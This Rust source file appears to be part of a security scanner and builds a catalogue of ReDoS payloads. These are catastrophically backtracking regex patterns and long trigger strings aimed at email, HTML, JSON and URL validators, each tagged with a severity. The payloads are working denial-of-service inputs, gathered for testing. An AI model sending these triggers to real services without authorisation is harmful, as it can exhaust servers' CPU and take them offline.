use super::{Payload, PayloadType, Severity};

pub fn get_payloads() -> Vec<Payload> {
    let mut payloads = Vec::new();

    let catastrophic_patterns = vec![
        ("(a+)+$", "Classic exponential regex", Severity::Critical),
        ("(a|aa)+$", "Alternation exponential", Severity::Critical),
        ("(a|a?)+$", "Optional exponential", Severity::Critical),
        ("(.*a){x}", "Quantifier with suffix", Severity::Critical),
        ("(a+)+b", "Exponential with suffix", Severity::Critical),
        ("(a+)+$", "Backtracking classic", Severity::Critical),
        (
            "([a-zA-Z]+)*$",
            "Character class quantified",
            Severity::High,
        ),
        ("(a+)+b$", "With terminal character", Severity::High),
        ("(([^a]|.)+)+$", "Complex alternation", Severity::High),
        ("(a*)+b", "Star inside plus", Severity::High),
    ];

    let regex_payloads = vec![
        ("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!", "Trigger (a+)+$ backtracking", Severity::Critical),
        ("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!", "Extended a sequence", Severity::Critical),
        ("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!", "Very long a sequence", Severity::Critical),
        ("aaaaaaaaaaaaX", "Trigger for (a+)+b", Severity::Critical),
        ("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!a", "Mixed trigger", Severity::High),
    ];

    let email_redos = vec![
        (
            "^([a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\\.[a-zA-Z0-9-.]+)$",
            "Email regex vulnerable",
            Severity::Critical,
        ),
        (
            "^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$",
            "Common email pattern",
            Severity::High,
        ),
        (
            "a@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
            "Long email trigger",
            Severity::Critical,
        ),
        (
            "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa@!",
            "Bad email trigger",
            Severity::Critical,
        ),
    ];

    let html_redos = vec![
        ("<\\s*img[^>]*>", "IMG tag regex", Severity::High),
        ("<img src=x onerror=\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\">", "Long HTML trigger", Severity::Critical),
        ("<div>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</div>", "Long div content", Severity::High),
    ];

    let json_redos = vec![
        ("\"[^\"]*\"", "Simple string regex", Severity::Medium),
        ("\"[^\"]*(\\\\.[^\"]*)*\"", "Escape handling regex", Severity::High),
        ("\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\\\", "JSON string trigger", Severity::High),
    ];

    let url_redos = vec![
        ("^(https?://)?([\\da-z\\.-]+)\\.([a-z\\.]{2,6})([/\\w \\.-]*)*/?$", "URL regex", Severity::High),
        ("https://example.com/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", "URL path trigger", Severity::Medium),
    ];

    let time_test_payloads = vec![
        (
            format!("{}!", "a".repeat(30)),
            "Short ReDoS trigger",
            Severity::High,
        ),
        (
            format!("{}!", "a".repeat(50)),
            "Medium ReDoS trigger",
            Severity::Critical,
        ),
        (
            format!("{}!", "a".repeat(100)),
            "Long ReDoS trigger",
            Severity::Critical,
        ),
        (
            format!("{}!", "a".repeat(200)),
            "Very long ReDoS trigger",
            Severity::Critical,
        ),
        (
            format!("{}X", "a".repeat(30)),
            "Suffix mismatch trigger",
            Severity::High,
        ),
        (
            format!("{}b", "a".repeat(30)),
            "Different suffix trigger",
            Severity::High,
        ),
    ];

    for (pattern, desc, severity) in catastrophic_patterns {
        payloads.push(Payload {
            payload_type: PayloadType::Redos,
            payload: pattern.to_string(),
            description: desc.to_string(),
            severity,
            tags: vec!["pattern".to_string()],
        });
    }

    for (payload, desc, severity) in regex_payloads {
        payloads.push(Payload {
            payload_type: PayloadType::Redos,
            payload: payload.to_string(),
            description: desc.to_string(),
            severity,
            tags: vec!["trigger".to_string()],
        });
    }

    for (pattern, desc, severity) in email_redos {
        payloads.push(Payload {
            payload_type: PayloadType::Redos,
            payload: pattern.to_string(),
            description: desc.to_string(),
            severity,
            tags: vec!["email".to_string()],
        });
    }

    for (payload, desc, severity) in html_redos {
        payloads.push(Payload {
            payload_type: PayloadType::Redos,
            payload: payload.to_string(),
            description: desc.to_string(),
            severity,
            tags: vec!["html".to_string()],
        });
    }

    for (payload, desc, severity) in json_redos {
        payloads.push(Payload {
            payload_type: PayloadType::Redos,
            payload: payload.to_string(),
            description: desc.to_string(),
            severity,
            tags: vec!["json".to_string()],
        });
    }

    for (payload, desc, severity) in url_redos {
        payloads.push(Payload {
            payload_type: PayloadType::Redos,
            payload: payload.to_string(),
            description: desc.to_string(),
            severity,
            tags: vec!["url".to_string()],
        });
    }

    for (payload, desc, severity) in time_test_payloads {
        payloads.push(Payload {
            payload_type: PayloadType::Redos,
            payload,
            description: desc.to_string(),
            severity,
            tags: vec!["time-test".to_string()],
        });
    }

    payloads
}
